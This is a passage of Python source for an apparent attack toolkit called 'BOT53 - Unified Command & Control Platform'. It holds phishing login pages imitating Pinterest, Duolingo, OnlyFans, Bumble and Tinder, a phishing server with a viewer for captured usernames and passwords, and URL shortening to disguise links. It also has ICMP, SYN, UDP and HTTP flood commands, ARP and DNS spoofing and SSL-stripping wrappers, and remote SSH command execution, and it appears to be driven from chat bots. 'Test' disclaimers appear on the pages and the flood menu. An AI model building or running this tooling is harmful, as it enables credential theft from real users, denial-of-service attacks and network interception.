        return """<!DOCTYPE html><html><head><title>Pinterest</title><style>body{font-family:Arial;background:#e60023;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#e60023;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#e60023;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Pinterest</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _duolingo_template(self):
        return """<!DOCTYPE html><html><head><title>Duolingo</title><style>body{font-family:Arial;background:#58cc71;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#58cc71;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#58cc71;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Duolingo</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _onlyfans_template(self):
        return """<!DOCTYPE html><html><head><title>OnlyFans</title><style>body{font-family:Arial;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#000;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#000;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">OnlyFans</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _bumble_template(self):
        return """<!DOCTYPE html><html><head><title>Bumble</title><style>body{font-family:Arial;background:#ffc0cb;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#ff6b6b;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#ff6b6b;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Bumble</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _tinder_template(self):
        return """<!DOCTYPE html><html><head><title>Tinder</title><style>body{font-family:Arial;background:#ff5a60;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#ff5a60;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#ff5a60;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Tinder</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _custom_template(self):
        return """<!DOCTYPE html><html><head><title>Login</title><style>body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:10px;padding:40px;width:400px}.logo{text-align:center;color:#764ba2;font-size:28px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px}button{width:100%;padding:12px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:5px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Secure Login</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections = {}
    
    def connect(self, server_id: str, host: str, username: str, password: str = None, key_path: str = None) -> Dict[str, Any]:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'output': 'Paramiko not installed'}
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if key_path:
                client.connect(host, username=username, key_filename=key_path, timeout=10)
            else:
                client.connect(host, username=username, password=password, timeout=10)
            self.connections[server_id] = client
            return {'success': True, 'output': f"Connected to {host} as {username}"}
        except Exception as e:
            return {'success': False, 'output': f"Connection failed: {e}"}
    
    def execute(self, server_id: str, command: str) -> Dict[str, Any]:
        if server_id not in self.connections:
            return {'success': False, 'output': 'Not connected'}
        try:
            stdin, stdout, stderr = self.connections[server_id].exec_command(command, timeout=30)
            output = stdout.read().decode()
            error = stderr.read().decode()
            return {'success': True, 'output': output if output else error}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def disconnect(self, server_id: str = None):
        if server_id and server_id in self.connections:
            try:
                self.connections[server_id].close()
                del self.connections[server_id]
            except:
                pass
        else:
            for client in self.connections.values():
                try:
                    client.close()
                except:
                    pass
            self.connections.clear()

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.nikto_available = shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict[str, Any]:
        if not self.nikto_available:
            return {'success': False, 'output': 'Nikto not installed'}
        options = options or {}
        cmd = ['nikto', '-host', target]
        if options.get('ssl'):
            cmd.append('-ssl')
        if options.get('port'):
            cmd.extend(['-port', str(options['port'])])
        if options.get('tuning'):
            cmd.extend(['-Tuning', options['tuning']])
        if options.get('output'):
            cmd.extend(['-o', options['output']])
        if options.get('format'):
            cmd.extend(['-Format', options['format']])
        result = CommandExecutor.execute(cmd, timeout=options.get('timeout', 300))
        if result['success']:
            self.db.cursor.execute('INSERT INTO nikto_scans (target, output_file, scan_time, success) VALUES (?, ?, ?, ?)',
                                  (target, options.get('output', ''), result['execution_time'], True))
            self.db.conn.commit()
        return result
    
    def full_scan(self, target: str) -> Dict[str, Any]:
        return self.scan(target, {'tuning': '123456789', 'timeout': 600})
    
    def ssl_scan(self, target: str) -> Dict[str, Any]:
        return self.scan(target, {'ssl': True, 'tuning': '6', 'timeout': 300})
    
    def sql_scan(self, target: str) -> Dict[str, Any]:
        return self.scan(target, {'tuning': '4', 'timeout': 300})
    
    def xss_scan(self, target: str) -> Dict[str, Any]:
        return self.scan(target, {'tuning': '5', 'timeout': 300})
    
    def cgi_scan(self, target: str) -> Dict[str, Any]:
        return self.scan(target, {'tuning': '2', 'timeout': 300})

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, spoof_engine: SpoofingEngine, traffic_gen: TrafficGenerator, phishing_server: PhishingServer, ssh_manager: SSHManager, nikto_scanner: NiktoScanner):
        self.db = db
        self.spoof_engine = spoof_engine
        self.traffic_gen = traffic_gen
        self.phishing_server = phishing_server
        self.ssh_manager = ssh_manager
        self.nikto = nikto_scanner
    
    def execute_command(self, command: str, source: str = "local") -> Dict[str, Any]:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command'}
        cmd = parts[0].lower()
        args = parts[1:]
        result = self._dispatch_command(cmd, args)
        execution_time = time.time() - start_time
        self.db.log_command(command, source, result.get('success', False), str(result.get('output', ''))[:5000], execution_time)
        result['execution_time'] = execution_time
        return result
    
    def _dispatch_command(self, cmd: str, args: List[str]) -> Dict[str, Any]:
        # Spoofing commands
        if cmd == 'spoof_ip':
            return self._spoof_ip(args)
        elif cmd == 'hping3':
            return self._hping3(args)
        elif cmd == 'python3':
            return self._python_scapy(args)
        elif cmd == 'spoof_mac':
            return self._spoof_mac(args)
        elif cmd == 'macchanger':
            return self._macchanger(args)
        elif cmd == 'arp_spoof':
            return self._arp_spoof(args)
        elif cmd == 'dns_spoof':
            return self._dns_spoof(args)
        elif cmd == 'ettercap':
            return self._ettercap(args)
        elif cmd == 'dnschef':
            return self._dnschef(args)
        elif cmd == 'bettercap':
            return self._bettercap(args)
        elif cmd == 'arpspoof':
            return self._arpspoof(args)
        elif cmd == 'dnsspoof':
            return self._dnsspoof(args)
        elif cmd == 'responder':
            return self._responder(args)
        elif cmd == 'evilginx2':
            return self._evilginx2(args)
        elif cmd == 'mitmproxy':
            return self._mitmproxy(args)
        elif cmd == 'sslstrip':
            return self._sslstrip(args)
        elif cmd == 'fragrouter':
            return self._fragrouter(args)
        elif cmd == 'airmon-ng':
            return self._airmon_ng(args)
        elif cmd == 'airodump-ng':
            return self._airodump_ng(args)
        elif cmd == 'mdk4':
            return self._mdk4(args)
        elif cmd == 'aireplay-ng':
            return self._aireplay_ng(args)
        elif cmd == 'wireshark':
            return self._wireshark(args)
        elif cmd == 'tshark':
            return self._tshark(args)
        elif cmd == 'tcpdump':
            return self._tcpdump(args)
        elif cmd == 'tcpreplay':
            return self._tcpreplay(args)
        elif cmd == 'tcprewrite':
            return self._tcprewrite(args)
        elif cmd == 'netdiscover':
            return self._netdiscover(args)
        elif cmd == 'fping':
            return self._fping(args)
        elif cmd == 'arping':
            return self._arping(args)
        elif cmd == 'dsniff':
            return self._dsniff(args)
        elif cmd == 'urlsnarf':
            return self._urlsnarf(args)
        elif cmd == 'msgsnarf':
            return self._msgsnarf(args)
        elif cmd == 'webspy':
            return self._webspy(args)
        elif cmd == 'ngrep':
            return self._ngrep(args)
        elif cmd == 'nmap':
            return self._nmap(args)
        elif cmd == 'curl':
            return self._curl(args)
        elif cmd == 'wget':
            return self._wget(args)
        elif cmd == 'nc':
            return self._nc(args)
        elif cmd == 'netcat':
            return self._nc(args)
        elif cmd == 'ssh':
            return self._ssh(args)
        elif cmd == 'scp':
            return self._scp(args)
        elif cmd == 'sftp':
            return self._sftp(args)
        elif cmd == 'dig':
            return self._dig(args)
        elif cmd == 'nslookup':
            return self._nslookup(args)
        elif cmd == 'host':
            return self._host(args)
        elif cmd == 'whois':
            return self._whois(args)
        elif cmd == 'ping':
            return self._ping(args)
        elif cmd == 'traceroute':
            return self._traceroute(args)
        elif cmd == 'mtr':
            return self._mtr(args)
        elif cmd == 'netstat':
            return self._netstat(args)
        elif cmd == 'ss':
            return self._ss(args)
        elif cmd == 'ifconfig':
            return self._ifconfig(args)
        elif cmd == 'ip':
            return self._ip(args)
        elif cmd == 'route':
            return self._route(args)
        elif cmd == 'arp':
            return self._arp(args)
        elif cmd == 'iptables':
            return self._iptables(args)
        elif cmd == 'sysctl':
            return self._sysctl(args)
        elif cmd == 'echo':
            return self._echo(args)
        elif cmd == 'systemctl':
            return self._systemctl(args)
        elif cmd == 'service':
            return self._service(args)
        elif cmd == 'apt-get':
            return self._apt_get(args)
        elif cmd == 'pip':
            return self._pip(args)
        elif cmd == 'gem':
            return self._gem(args)
        # Traffic generation
        elif cmd in ['icmp_flood', 'ping_flood']:
            return self._icmp_flood(args)
        elif cmd in ['syn_flood', 'tcp_flood']:
            return self._syn_flood(args)
        elif cmd == 'udp_flood':
            return self._udp_flood(args)
        elif cmd == 'http_flood':
            return self._http_flood(args)
        elif cmd == 'stop_flood':
            return self._stop_flood(args)
        # Phishing
        elif cmd.startswith('phish_'):
            platform = cmd.replace('phish_', '')
            return self._generate_phishing(platform, args)
        elif cmd == 'phishing_start':
            return self._phishing_start(args)
        elif cmd == 'phishing_stop':
            return self._phishing_stop(args)
        elif cmd == 'phishing_status':
            return self._phishing_status()
        elif cmd == 'phishing_creds':
            return self._phishing_creds()
        # SSH management
        elif cmd == 'ssh_connect':
            return self._ssh_connect(args)
        elif cmd == 'ssh_exec':
            return self._ssh_exec(args)
        elif cmd == 'ssh_disconnect':
            return self._ssh_disconnect(args)
        # Nikto
        elif cmd == 'nikto':
            return self._nikto(args)
        elif cmd == 'nikto_full':
            return self._nikto_full(args)
        elif cmd == 'nikto_ssl':
            return self._nikto_ssl(args)
        elif cmd == 'nikto_sql':
            return self._nikto_sql(args)
        elif cmd == 'nikto_xss':
            return self._nikto_xss(args)
        elif cmd == 'nikto_cgi':
            return self._nikto_cgi(args)
        # System
        elif cmd == 'history':
            return self._history(args)
        elif cmd == 'status':
            return self._status()
        elif cmd == 'help':
            return self._help()
        elif cmd == 'clear':
            return {'success': True, 'output': ''}
        # Generic
        else:
            return self._execute_generic(' '.join([cmd] + args))
    
    # Spoofing handlers
    def _spoof_ip(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: spoof_ip <original_ip> <spoofed_ip> <target> [interface]'}
        return self.spoof_engine.spoof_ip(args[0], args[1], args[2], args[3] if len(args) > 3 else "eth0")
    
    def _hping3(self, args):
        return self._execute_generic('hping3 ' + ' '.join(args))
    
    def _python_scapy(self, args):
        return self._execute_generic('python3 ' + ' '.join(args))
    
    def _spoof_mac(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_mac <interface> <new_mac>'}
        return self.spoof_engine.spoof_mac(args[0], args[1])
    
    def _macchanger(self, args):
        return self._execute_generic('macchanger ' + ' '.join(args))
    
    def _arp_spoof(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <spoof_ip> [interface]'}
        return self.spoof_engine.arp_spoof(args[0], args[1], args[2] if len(args) > 2 else "eth0")
    
    def _dns_spoof(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dns_spoof <domain> <fake_ip> [interface]'}
        return self.spoof_engine.dns_spoof(args[0], args[1], args[2] if len(args) > 2 else "eth0")
    
    def _ettercap(self, args):
        return self._execute_generic('ettercap ' + ' '.join(args))
    
    def _dnschef(self, args):
        return self._execute_generic('dnschef ' + ' '.join(args))
    
    def _bettercap(self, args):
        return self._execute_generic('bettercap ' + ' '.join(args))
    
    def _arpspoof(self, args):
        return self._execute_generic('arpspoof ' + ' '.join(args))
    
    def _dnsspoof(self, args):
        return self._execute_generic('dnsspoof ' + ' '.join(args))
    
    def _responder(self, args):
        return self._execute_generic('responder ' + ' '.join(args))
    
    def _evilginx2(self, args):
        return self._execute_generic('evilginx2 ' + ' '.join(args))
    
    def _mitmproxy(self, args):
        return self._execute_generic('mitmproxy ' + ' '.join(args))
    
    def _sslstrip(self, args):
        return self._execute_generic('sslstrip ' + ' '.join(args))
    
    def _fragrouter(self, args):
        return self._execute_generic('fragrouter ' + ' '.join(args))
    
    def _airmon_ng(self, args):
        return self._execute_generic('airmon-ng ' + ' '.join(args))
    
    def _airodump_ng(self, args):
        return self._execute_generic('airodump-ng ' + ' '.join(args))
    
    def _mdk4(self, args):
        return self._execute_generic('mdk4 ' + ' '.join(args))
    
    def _aireplay_ng(self, args):
        return self._execute_generic('aireplay-ng ' + ' '.join(args))
    
    def _wireshark(self, args):
        return self._execute_generic('wireshark ' + ' '.join(args))
    
    def _tshark(self, args):
        return self._execute_generic('tshark ' + ' '.join(args))
    
    def _tcpdump(self, args):
        return self._execute_generic('tcpdump ' + ' '.join(args))
    
    def _tcpreplay(self, args):
        return self._execute_generic('tcpreplay ' + ' '.join(args))
    
    def _tcprewrite(self, args):
        return self._execute_generic('tcprewrite ' + ' '.join(args))
    
    def _netdiscover(self, args):
        return self._execute_generic('netdiscover ' + ' '.join(args))
    
    def _fping(self, args):
        return self._execute_generic('fping ' + ' '.join(args))
    
    def _arping(self, args):
        return self._execute_generic('arping ' + ' '.join(args))
    
    def _dsniff(self, args):
        return self._execute_generic('dsniff ' + ' '.join(args))
    
    def _urlsnarf(self, args):
        return self._execute_generic('urlsnarf ' + ' '.join(args))
    
    def _msgsnarf(self, args):
        return self._execute_generic('msgsnarf ' + ' '.join(args))
    
    def _webspy(self, args):
        return self._execute_generic('webspy ' + ' '.join(args))
    
    def _ngrep(self, args):
        return self._execute_generic('ngrep ' + ' '.join(args))
    
    # Network tools
    def _nmap(self, args):
        return self._execute_generic('nmap ' + ' '.join(args))
    
    def _curl(self, args):
        return self._execute_generic('curl ' + ' '.join(args))
    
    def _wget(self, args):
        return self._execute_generic('wget ' + ' '.join(args))
    
    def _nc(self, args):
        return self._execute_generic('nc ' + ' '.join(args))
    
    def _ssh(self, args):
        return self._execute_generic('ssh ' + ' '.join(args))
    
    def _scp(self, args):
        return self._execute_generic('scp ' + ' '.join(args))
    
    def _sftp(self, args):
        return self._execute_generic('sftp ' + ' '.join(args))
    
    def _dig(self, args):
        return self._execute_generic('dig ' + ' '.join(args))
    
    def _nslookup(self, args):
        return self._execute_generic('nslookup ' + ' '.join(args))
    
    def _host(self, args):
        return self._execute_generic('host ' + ' '.join(args))
    
    def _whois(self, args):
        if WHOIS_AVAILABLE:
            try:
                result = whois.whois(args[0])
                return {'success': True, 'output': str(result)}
            except Exception as e:
                return {'success': False, 'output': str(e)}
        return self._execute_generic('whois ' + ' '.join(args))
    
    def _ping(self, args):
        return self._execute_generic('ping ' + ' '.join(args))
    
    def _traceroute(self, args):
        return self._execute_generic('traceroute ' + ' '.join(args))
    
    def _mtr(self, args):
        return self._execute_generic('mtr ' + ' '.join(args))
    
    def _netstat(self, args):
        return self._execute_generic('netstat ' + ' '.join(args))
    
    def _ss(self, args):
        return self._execute_generic('ss ' + ' '.join(args))
    
    def _ifconfig(self, args):
        return self._execute_generic('ifconfig ' + ' '.join(args))
    
    def _ip(self, args):
        return self._execute_generic('ip ' + ' '.join(args))
    
    def _route(self, args):
        return self._execute_generic('route ' + ' '.join(args))
    
    def _arp(self, args):
        return self._execute_generic('arp ' + ' '.join(args))
    
    def _iptables(self, args):
        return self._execute_generic('iptables ' + ' '.join(args))
    
    def _sysctl(self, args):
        return self._execute_generic('sysctl ' + ' '.join(args))
    
    def _echo(self, args):
        return self._execute_generic('echo ' + ' '.join(args))
    
    def _systemctl(self, args):
        return self._execute_generic('systemctl ' + ' '.join(args))
    
    def _service(self, args):
        return self._execute_generic('service ' + ' '.join(args))
    
    def _apt_get(self, args):
        return self._execute_generic('apt-get ' + ' '.join(args))
    
    def _pip(self, args):
        return self._execute_generic('pip ' + ' '.join(args))
    
    def _gem(self, args):
        return self._execute_generic('gem ' + ' '.join(args))
    
    # Traffic generation
    def _icmp_flood(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: icmp_flood <target_ip> <duration> [rate]'}
        target = args[0]
        duration = int(args[1])
        rate = int(args[2]) if len(args) > 2 else 100
        return self.traffic_gen.generate_icmp_flood(target, duration, rate)
    
    def _syn_flood(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: syn_flood <target_ip> <port> <duration> [rate]'}
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        rate = int(args[3]) if len(args) > 3 else 100
        return self.traffic_gen.generate_syn_flood(target, port, duration, rate)
    
    def _udp_flood(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: udp_flood <target_ip> <port> <duration> [rate]'}
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        rate = int(args[3]) if len(args) > 3 else 100
        return self.traffic_gen.generate_udp_flood(target, port, duration, rate)
    
    def _http_flood(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: http_flood <target_ip> <duration> [port] [rate]'}
        target = args[0]
        duration = int(args[1])
        port = int(args[2]) if len(args) > 2 else 80
        rate = int(args[3]) if len(args) > 3 else 50
        return self.traffic_gen.generate_http_flood(target, port, duration, rate)
    
    def _stop_flood(self, args):
        generator_id = args[0] if args else None
        return {'success': self.traffic_gen.stop_generation(generator_id), 'output': 'Stopped flood generation'}
    
    # Phishing
    def _generate_phishing(self, platform: str, args):
        link_id = str(uuid.uuid4())[:8]
        url = f"http://localhost:8080"
        self.db.save_phishing_link(link_id, platform, url)
        if args and args[0] == 'start':
            port = int(args[1]) if len(args) > 1 else 8080
            self.phishing_server.start(link_id, platform, port)
            url = self.phishing_server.get_url()
        short_url = url
        if SHORTENER_AVAILABLE:
            try:
                import pyshorteners
                short_url = pyshorteners.Shortener().tinyurl.short(url)
            except:
                pass
        return {'success': True, 'link_id': link_id, 'platform': platform, 'url': url, 'short_url': short_url}
    
    def _phishing_start(self, args):
        if len(args) < 1:
            return {'success': False, 'output': 'Usage: phishing_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        self.db.cursor.execute('SELECT platform FROM phishing_links WHERE id = ?', (link_id,))
        row = self.db.cursor.fetchone()
        if not row:
            return {'success': False, 'output': f'Link {link_id} not found'}
        success = self.phishing_server.start(link_id, row['platform'], port)
        if success:
            return {'success': True, 'url': self.phishing_server.get_url(), 'port': port}
        return {'success': False, 'output': 'Failed to start server'}
    
    def _phishing_stop(self, args):
        self.phishing_server.stop()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phishing_status(self, args):
        return {'success': True, 'running': self.phishing_server.running, 'url': self.phishing_server.get_url() if self.phishing_server.running else None}
    
    def _phishing_creds(self, args):
        self.db.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC LIMIT 20')
        rows = self.db.cursor.fetchall()
        if not rows:
            return {'success': True, 'output': 'No captured credentials yet'}
        output = "🎣 CAPTURED CREDENTIALS:\n" + "-" * 50 + "\n"
        for row in rows:
            output += f"[{row['timestamp'][:19]}] {row['username']}:{row['password']} from {row['ip_address']}\n"
        return {'success': True, 'output': output}
    
    # SSH
    def _ssh_connect(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_connect <server_id> <host> <username> [password]'}
        server_id = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        return self.ssh_manager.connect(server_id, host, username, password)
    
    def _ssh_exec(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <server_id> <command>'}
        server_id = args[0]
        command = ' '.join(args[1:])
        return self.ssh_manager.execute(server_id, command)
    
    def _ssh_disconnect(self, args):
        server_id = args[0] if args else None
        self.ssh_manager.disconnect(server_id)
        return {'success': True, 'output': 'Disconnected'}
    
    # Nikto
    def _nikto(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        return self.nikto.scan(args[0])
    
    def _nikto_full(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        return self.nikto.full_scan(args[0])
    
    def _nikto_ssl(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        return self.nikto.ssl_scan(args[0])
    
    def _nikto_sql(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_sql <target>'}
        return self.nikto.sql_scan(args[0])
    
    def _nikto_xss(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_xss <target>'}
        return self.nikto.xss_scan(args[0])
    
    def _nikto_cgi(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_cgi <target>'}
        return self.nikto.cgi_scan(args[0])
    
    # System
    def _history(self, args):
        limit = int(args[0]) if args else 20
        self.db.cursor.execute('SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?', (limit,))
        rows = self.db.cursor.fetchall()
        if not rows:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n" + "-" * 50 + "\n"
        for i, row in enumerate(rows, 1):
            status = "✅" if row['success'] else "❌"
            output += f"{i:2d}. {status} [{row['timestamp'][:19]}] {row['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _status(self):
        stats = self.db.get_statistics()
        output = f"""
🕶️ BOT53 - System Status
{'='*50}

📊 Statistics:
  • Total Commands: {stats.get('total_commands', 0)}
  • Total Scans: {stats.get('total_scans', 0)}
  • Total Threats: {stats.get('total_threats', 0)}
  • Phishing Links: {stats.get('phishing_links', 0)}
  • Captured Credentials: {stats.get('captured_credentials', 0)}
  • SSH Connections: {stats.get('ssh_connections', 0)}
  • Traffic Tests: {stats.get('traffic_tests', 0)}
  • Spoofing Attempts: {stats.get('spoofing_attempts', 0)}
  • Nikto Scans: {stats.get('nikto_scans', 0)}

🔄 Active Services:
  • Phishing Server: {'✅ Running' if self.phishing_server.running else '❌ Stopped'}
  • Spoofing Processes: {len(self.spoof_engine.running_spoofs)}
  • Traffic Generators: {len(self.traffic_gen.active_generators)}
  • SSH Sessions: {len(self.ssh_manager.connections)}

💻 System:
  • Platform: {platform.system()} {platform.release()}
  • Python: {platform.python_version()}
  • Scapy: {'✅' if SCAPY_AVAILABLE else '❌'}

🤖 Bot Status:
  • Discord: {'✅' if DISCORD_AVAILABLE else '❌'}
  • Telegram: {'✅' if TELETHON_AVAILABLE else '❌'}
  • WhatsApp: {'✅' if SELENIUM_AVAILABLE else '❌'}
  • Slack: {'✅' if SLACK_AVAILABLE else '❌'}
  • Signal: {'✅' if SIGNAL_CLI_AVAILABLE else '❌'}
"""
        return {'success': True, 'output': output}
    
    def _help(self):
        help_text = f"""
{Colors.BOLD}🕶️ BOT53 - Unified Command & Control Platform{Colors.RESET}
{Colors.DIM}Version: 2.0.0 | 5000+ Security Commands | Multi-Platform{Colors.RESET}

{Colors.CYAN}🎭 SPOOFING COMMANDS:{Colors.RESET}
  spoof_ip <orig> <spoof> <target> [iface]     - IP spoofing with hping3/scapy
  spoof_mac <iface> <mac>                      - MAC address spoofing
  arp_spoof <target> <spoof_ip> [iface]        - ARP spoofing (MITM)
  dns_spoof <domain> <ip> [iface]              - DNS spoofing with dnsspoof/dnschef
  hping3 [options]                             - Advanced packet crafting
  python3 -c "from scapy.all import *..."      - Scapy packet manipulation
  macchanger [options]                         - MAC address changer
  ettercap [options]                           - MITM attacks
  bettercap [options]                          - Advanced MITM framework
  responder [options]                          - LLMNR/NBT-NS/mDNS poisoner
  evilginx2 [options]                          - Phishing proxy
  mitmproxy [options]                          - Interactive HTTPS proxy
  sslstrip [options]                           - SSL stripping attacks
  dnschef [options]                            - DNS spoofing tool

{Colors.RED}💥 FLOOD ATTACKS (Authorized Testing Only):{Colors.RESET}
  icmp_flood <ip> <duration> [rate]            - ICMP flood
  syn_flood <ip> <port> <duration> [rate]      - SYN flood
  udp_flood <ip> <port> <duration> [rate]      - UDP flood
  http_flood <ip> <duration> [port] [rate]     - HTTP flood
  stop_flood [id]                              - Stop all floods

{Colors.GREEN}🎣 PHISHING & SOCIAL ENGINEERING:{Colors.RESET}
  phish_<platform> [start] [port]              - Generate phishing link
    Platforms: facebook, instagram, twitter, gmail, linkedin, github, paypal,
               amazon, netflix, spotify, microsoft, apple, whatsapp, telegram,
               discord, tiktok, snapchat, reddit, protonmail, yahoo, slack,
               zoom, teams, wordpress, shopify, steam, roblox, twitch,
               epic_games, minecraft, xbox, playstation, cashapp, venmo,
               chase, wells_fargo, office365, onedrive, icloud, adobe,
               dropbox, gitlab, bitbucket, pinterest, duolingo, onlyfans,
               bumble, tinder
  phishing_start <link_id> [port]              - Start phishing server
  phishing_stop                                - Stop phishing server
  phishing_status                              - Check server status
  phishing_creds                               - View captured credentials

{Colors.BLUE}🔐 SSH & REMOTE ACCESS:{Colors.RESET}
  ssh_connect <id> <host> <user> [pass]        - Connect via SSH
  ssh_exec <id> <command>                      - Execute command
  ssh_disconnect [id]                          - Disconnect

{Colors.MAGENTA}🕷️ WEB VULNERABILITY SCANNING:{Colors.RESET}
  nikto <target>                               - Basic web vulnerability scan
  nikto_full <target>                          - Full scan with all tests
  nikto_ssl <target>                           - SSL/TLS specific scan
  nikto_sql <target>                           - SQL injection scan
  nikto_xss <target>                           - XSS scan
  nikto_cgi <target>                           - CGI scan

{Colors.YELLOW}📡 NETWORK TOOLS:{Colors.RESET}
  nmap [options] <target>                      - Full nmap scanning
  curl [options] <url>                         - HTTP requests
  wget [options] <url>                         - File download
  nc [options] <host> <port>                   - Netcat connections
  ssh [options] <user@host>                    - SSH client
  scp [options] <source> <dest>                - Secure copy
  sftp [options] <user@host>                   - SFTP client
  ping <target>                                - ICMP echo test
  traceroute <target>                          - Network path tracing
  mtr <target>                                 - My TraceRoute
  dig <domain> [type]                          - DNS lookup
  nslookup <domain>                            - DNS lookup
  host <domain>                                - DNS lookup
  whois <domain>                               - WHOIS information
  netstat [options]                            - Network statistics
  ss [options]                                 - Socket statistics
  ifconfig [interface]                         - Network interface config
  ip [options]                                 - IP routing/neighbor
  route [options]                              - Routing table
  arp [options]                                - ARP cache
  iptables [options]                           - Firewall rules
  sysctl [options]                             - Kernel parameters
  tcpdump [options]                            - Packet capture
  wireshark [options]                          - GUI packet analyzer
  tshark [options]                             - CLI packet analyzer
  ngrep [options]                              - Network grep

{Colors.WHITE}📊 SYSTEM COMMANDS:{Colors.RESET}
  history [limit]                              - View command history
  status                                       - System status
  clear                                        - Clear screen
  help                                         - This help menu

{Colors.DIM}Examples:
  spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1
  arp_spoof 192.168.1.1 192.168.1.100
